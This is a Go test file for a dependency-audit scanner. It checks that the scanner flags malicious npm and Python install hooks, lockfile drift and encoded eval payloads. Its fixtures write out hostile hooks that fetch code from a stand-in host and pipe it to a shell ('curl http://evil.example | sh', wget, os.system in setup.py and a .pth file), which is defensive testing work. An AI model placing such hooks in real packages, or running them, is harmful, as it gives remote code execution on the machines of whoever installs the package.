package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/omni-line/omni-audit/internal/ecosystem"
	"github.com/omni-line/omni-audit/internal/installhook"
	"github.com/omni-line/omni-audit/internal/match"
	"github.com/omni-line/omni-audit/internal/registry"
	"github.com/omni-line/omni-audit/internal/scan"
)

func hookOpts(installed bool) scan.Options {
	return scan.Options{
		Ecosystems:  []ecosystem.Ecosystem{ecosystem.NPM(&countingChecker{status: registry.Exists})},
		NoUnclaimed: true,
		NoSources:   true,
		NoTyposquat: true,
		NoMalicious: true,
		NoConfig:    true,
		Installed:   installed,
	}
}

func byKind(res *scan.Result) map[string]scan.Finding {
	out := map[string]scan.Finding{}
	for _, f := range res.Findings {
		out[f.Kind] = f
	}
	return out
}

func TestProjectInstallHookWithoutInstalledTree(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{
  "name": "app",
  "scripts": {
    "test": "curl http://example.test",
    "postinstall": "curl http://evil.example | sh"
  }
}`)
	mustWrite(t, filepath.Join(root, "setup.py"), "from setuptools import setup\nsetup(name='app')\n")
	mustWrite(t, filepath.Join(root, "node_modules", "evil", "package.json"), `{
  "name": "evil",
  "version": "1.0.0",
  "scripts": {"postinstall": "curl http://evil.example | sh"}
}`)

	res, err := scan.Run(context.Background(), root, hookOpts(false))
	if err != nil {
		t.Fatal(err)
	}
	got := byKind(res)
	if len(res.Findings) != 1 || got[installhook.KindShell].Package != "app" {
		t.Fatalf("findings: %+v", res.Findings)
	}
	if got[installhook.KindShell].Group != "postinstall" || got[installhook.KindShell].Reason != scan.ReasonInstallHook {
		t.Fatalf("finding: %+v", got[installhook.KindShell])
	}
	if res.Stats.HookFiles != 2 {
		t.Fatalf("hook files: %d", res.Stats.HookFiles)
	}
	if res.Stats.InstalledPackages != 0 {
		t.Fatalf("installed packages scanned without --installed: %d", res.Stats.InstalledPackages)
	}
}

func TestInstalledTreeDriftAndPayload(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{"name":"app","dependencies":{"lodash":"4.17.21"}}`)
	mustWrite(t, filepath.Join(root, "package-lock.json"), `{
  "name": "app",
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "app"},
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    }
  }
}`)
	mustWrite(t, filepath.Join(root, "node_modules", "lodash", "package.json"), `{
  "name": "lodash",
  "version": "9.9.9",
  "scripts": {"postinstall": "node install.js"}
}`)
	mustWrite(t, filepath.Join(root, "node_modules", "lodash", "install.js"),
		"eval(Buffer.from('aaa', 'base64').toString())\n")
	mustWrite(t, filepath.Join(root, "node_modules", "extra", "package.json"), `{
  "name": "extra",
  "version": "1.0.0"
}`)
	// pnpm layout: the real package lives under .pnpm, and the top-level name is a symlink.
	pnpmPkg := filepath.Join(root, "node_modules", ".pnpm", "left-pad@1.0.0", "node_modules", "left-pad")
	mustWrite(t, filepath.Join(pnpmPkg, "package.json"), `{"name":"left-pad","version":"1.0.0"}`)
	if err := os.Symlink(pnpmPkg, filepath.Join(root, "node_modules", "left-pad")); err != nil {
		t.Fatal(err)
	}
	// A workspace link points outside node_modules. Its payload is the project's own file.
	ws := filepath.Join(root, "packages", "app")
	mustWrite(t, filepath.Join(ws, "package.json"), `{
  "name": "@acme/app",
  "scripts": {"postinstall": "wget http://evil.example/a"}
}`)
	if err := os.MkdirAll(filepath.Join(root, "node_modules", "@acme"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(ws, filepath.Join(root, "node_modules", "@acme", "app")); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), root, hookOpts(true))
	if err != nil {
		t.Fatal(err)
	}
	var mismatch, missing, decode, shells int
	var decodePath string
	for _, f := range res.Findings {
		switch f.Kind {
		case installhook.KindVersionMismatch:
			mismatch++
			if f.Package != "lodash" || f.Version != "9.9.9" {
				t.Fatalf("mismatch: %+v", f)
			}
		case installhook.KindNotInLockfile:
			missing++
		case installhook.KindDecode:
			decode++
			decodePath = f.Manifest
		case installhook.KindShell:
			shells++
			if f.Package != "@acme/app" {
				t.Fatalf("shell package: %+v", f)
			}
		default:
			t.Fatalf("unexpected finding: %+v", f)
		}
	}
	if mismatch != 1 || decode != 1 || shells != 1 {
		t.Fatalf("mismatch=%d decode=%d shells=%d findings=%+v", mismatch, decode, shells, res.Findings)
	}
	if missing != 2 { // extra and left-pad (symlink and real path are one package)
		t.Fatalf("missing=%d findings=%+v", missing, res.Findings)
	}
	if filepath.Base(decodePath) != "install.js" {
		t.Fatalf("decode path: %s", decodePath)
	}
	if res.Stats.InstalledPackages < 3 {
		t.Fatalf("installed packages: %d", res.Stats.InstalledPackages)
	}
}

func TestInstalledMatchingVersionIsClean(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{"name":"app"}`)
	mustWrite(t, filepath.Join(root, "package-lock.json"), `{
  "name": "app",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    }
  }
}`)
	mustWrite(t, filepath.Join(root, "node_modules", "lodash", "package.json"), `{
  "name": "lodash",
  "version": "4.17.21",
  "scripts": {"postinstall": "node-gyp rebuild"}
}`)
	res, err := scan.Run(context.Background(), root, hookOpts(true))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 0 {
		t.Fatalf("findings: %+v", res.Findings)
	}
}

func TestVenvPthRequiresInstalled(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{"name":"app"}`)
	pth := filepath.Join(root, ".venv", "lib", "python3.12", "site-packages", "evil.pth")
	mustWrite(t, pth, "import os; os.system('curl http://evil.example')\n")

	off, err := scan.Run(context.Background(), root, hookOpts(false))
	if err != nil {
		t.Fatal(err)
	}
	if len(off.Findings) != 0 {
		t.Fatalf("venv scanned without --installed: %+v", off.Findings)
	}
	on, err := scan.Run(context.Background(), root, hookOpts(true))
	if err != nil {
		t.Fatal(err)
	}
	if len(on.Findings) != 1 || on.Findings[0].Kind != installhook.KindShell || on.Findings[0].Ecosystem != "pypi" {
		t.Fatalf("findings: %+v", on.Findings)
	}
}

func TestIgnoreSkipsInstallHook(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{
  "name": "evilpkg",
  "scripts": {"preinstall": "curl http://evil.example | sh"}
}`)
	ig, err := match.Compile("evilpkg")
	if err != nil {
		t.Fatal(err)
	}
	opts := hookOpts(false)
	opts.Ignore = ig
	res, err := scan.Run(context.Background(), root, opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 0 {
		t.Fatalf("ignored package still reported: %+v", res.Findings)
	}
}

func TestSafeNamespaceDoesNotSkipInstallHook(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{
  "name": "@acme/widget",
  "scripts": {"postinstall": "curl http://evil.example | sh"}
}`)
	ns, err := match.Compile("@acme/*")
	if err != nil {
		t.Fatal(err)
	}
	opts := hookOpts(false)
	opts.SafeNamespaces = ns
	res, err := scan.Run(context.Background(), root, opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 1 {
		t.Fatalf("safe namespace suppressed an install hook: %+v", res.Findings)
	}
}

func TestInstalledUsesNearestLockfile(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{"name":"root"}`)
	mustWrite(t, filepath.Join(root, "package-lock.json"), `{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    }
  }
}`)
	web := filepath.Join(root, "apps", "web")
	mustWrite(t, filepath.Join(web, "package-lock.json"), `{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/widget": {
      "version": "1.2.3",
      "resolved": "https://registry.npmjs.org/widget/-/widget-1.2.3.tgz"
    }
  }
}`)
	mustWrite(t, filepath.Join(web, "node_modules", "widget", "package.json"), `{"name":"widget","version":"1.2.3"}`)
	mustWrite(t, filepath.Join(web, "node_modules", "stray", "package.json"), `{"name":"stray","version":"1.0.0"}`)

	res, err := scan.Run(context.Background(), root, hookOpts(true))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 1 || res.Findings[0].Package != "stray" || res.Findings[0].Kind != installhook.KindNotInLockfile {
		t.Fatalf("findings: %+v", res.Findings)
	}
}

func TestNoInstallHookDisablesTheCheck(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "setup.py"), "import os\nos.system('curl http://evil.example | sh')\n")
	opts := hookOpts(false)
	opts.NoInstallHook = true
	res, err := scan.Run(context.Background(), root, opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 0 || containsCheck(res.Checks, scan.ReasonInstallHook) {
		t.Fatalf("findings=%+v checks=%v", res.Findings, res.Checks)
	}
}

func TestDoesNotFollowScriptOutsidePackage(t *testing.T) {
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "package.json"), `{
  "name": "app",
  "scripts": {"postinstall": "node ../../outside.js"}
}`)
	res, err := scan.Run(context.Background(), root, hookOpts(false))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 0 {
		t.Fatalf("followed a path outside the package: %+v", res.Findings)
	}
}

func containsCheck(checks []string, want string) bool {
	for _, c := range checks {
		if c == want {
			return true
		}
	}
	return false
}
